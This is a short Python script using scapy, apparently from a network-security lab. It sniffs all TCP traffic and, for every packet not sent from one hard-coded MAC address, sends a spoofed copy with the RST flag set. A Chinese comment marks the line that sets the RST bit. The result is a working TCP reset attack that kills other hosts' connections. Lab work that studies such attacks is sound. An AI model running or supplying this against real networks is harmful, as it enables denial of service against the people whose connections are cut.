#!/usr/bin/python
from scapy.all import *

def print_pkt(pkt):
    if pkt.src!="00:0c:29:c5:74:50":
        ip=IP(src=pkt[IP].src,dst=pkt[IP].dst)
        tcp=TCP(sport=pkt[TCP].sport,dport=pkt[TCP].dport,flags=pkt[TCP].flags,seq=pkt[TCP].seq,ack=pkt[TCP].ack)
        tcp.flags=tcp.flags | 0x4
        #设置RST位
        ppkt=ip/tcp
        send(ppkt)
        #ls(ppkt)
pkt=sniff(filter='tcp',prn=print_pkt)
